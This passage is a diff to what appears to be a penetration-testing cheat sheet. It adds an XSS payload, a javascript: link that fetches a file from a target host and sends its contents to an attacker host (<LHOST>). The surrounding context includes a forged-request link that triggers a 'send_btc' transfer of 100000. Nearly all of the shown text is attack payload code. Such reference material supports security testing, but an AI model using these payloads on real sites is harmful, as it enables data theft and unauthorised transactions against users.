@@ -4719,9 +4719,15 @@ xmlhttp.open("GET", '<RHOST>');
 xmlhttp.send(null);
 ```
 
-### XSS client-Side Attack
+### XSS Client-Side Attacks
 
-#### Request Example
+#### Reverse JavaScript Execution
+
+```c
+<a href="javascript:fetch('http://<RHOST>/<FILE>').then(r=>r.text()).then(d=>fetch('http://<LHOST>/?response='+encodeURIComponent(d))).catch(e=>console.error('Error:',e));"><COMMENT></a>
+```
+
+#### XSS Client-Side Request Example
 
 ```c
 <a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
